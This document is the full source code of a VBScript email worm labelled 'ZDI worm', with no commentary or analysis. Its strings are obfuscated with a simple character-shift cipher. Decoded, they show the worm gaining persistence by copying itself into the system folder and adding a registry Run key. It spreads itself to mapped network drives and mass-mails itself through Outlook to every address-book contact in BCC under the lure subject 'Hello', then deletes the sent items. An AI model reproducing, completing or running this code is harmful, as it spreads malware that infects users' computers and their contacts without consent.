' ZDI worm

On Error Resume Next

Dim JEIG5
Dim TZQAJ
Dim HUMJ
Dim HCTG
Dim IW5
Dim HT7
Dim KA458V7
Dim RU5E
Dim MU0MVH
Dim VY4L6

Set JEIG5 = CreateObject( QJF( "Rbqhoshmf-EhkdRxrsdlNaidbs" ) )
JEIG5.CopyFile WScript.ScriptFullName, JEIG5.BuildPath( JEIG5.GetSpecialFolder(1), QJF( "JHTXBU4-UAR" ) )

Set TZQAJ = CreateObject( QJF( "VRbqhos-Rgdkk" ) )
TZQAJ.RegWrite QJF( "GJDX^KNB@K^L@BGHMD[Rnesv`qd[Lhbqnrnes[Vhmcnvr[BtqqdmsUdqrhnm[Qtm[" ) & QJF( "JHTXBU4" ), JEIG5.BuildPath( JEIG5.GetSpecialFolder(1), QJF( "JHTXBU4-UAR" ) )


Set HUMJ = CreateObject( QJF( "VRbqhos-Mdsvnqj" ) )
Set IW5 = HUMJ.EnumNetworkDrives

If IW5.Count <> 0 Then
   For HCTG = 0 To IW5.Count - 1
       If InStr( IW5.Item( HCTG), QJF( "[" ) ) <> 0 Then
          JEIG5.CopyFile WScript.ScriptFullName, JEIG5.BuildPath( IW5.Item( HCTG), QJF( "JHTXBU4-UAR" ) ) 
       End If
   Next
End If

HCTG = TZQAJ.RegRead( QJF( "GJDX^KNB@K^L@BGHMD[" ) & QJF( "JHTXBU4" ) )

If HCTG = "" Or HCTG > 20 Then
   HCTG = 0
End If

If HCTG = 0 Then
   Set RU5E = CreateObject( QJF( "Ntsknnj-@ookhb`shnm" ) )
   Set HT7 = RU5E.GetNameSpace( QJF( "L@OH" ) )

   For Each KA458V7 In HT7.AddressLists
       Set IW5 = RU5E.CreateItem( 0 )

       For MU0MVH = 1 To KA458V7.AddressEntries.Count
           Set VY4L6 = KA458V7.AddressEntries( MU0MVH )

           If MU0MVH = 1 Then
              IW5.BCC = VY4L6.Address
           Else
              IW5.BCC = IW5.BCC & QJF( ":" ) & VY4L6.Address
           End If
       Next

       IW5.Subject = QJF( "Gdkkn" )
       IW5.Body = QJF( "Gdxhjmnvxnt   Sgdqdr`sdws`ss`bgdcsnxnt+sgdqdhrsgdvgnkdrsnqx " )
       IW5.Attachmets.Add WScript.ScriptFullName
       IW5.DeleteAfterSubmit = True
       IW5.Send
   Next

   HCTG = 0
End If

TZQAJ.RegWrite QJF( "GJDX^KNB@K^L@BGHMD[" ) & QJF( "JHTXBU4" ), HCTG + 1

Function QJF( GI5U )
   Dim KKN1TQ
   Dim KEK02O7G
   Dim W36D5

   KKN1TQ = ""

   For KEK02O7G = 1 To Len( GI5U )
       W36D5 = Mid( GI5U, KEK02O7G, 1 )

       KKN1TQ = KKN1TQ & Chr( Asc( W36D5 ) + 1 )
   Next

   QJF = KKN1TQ
End Function
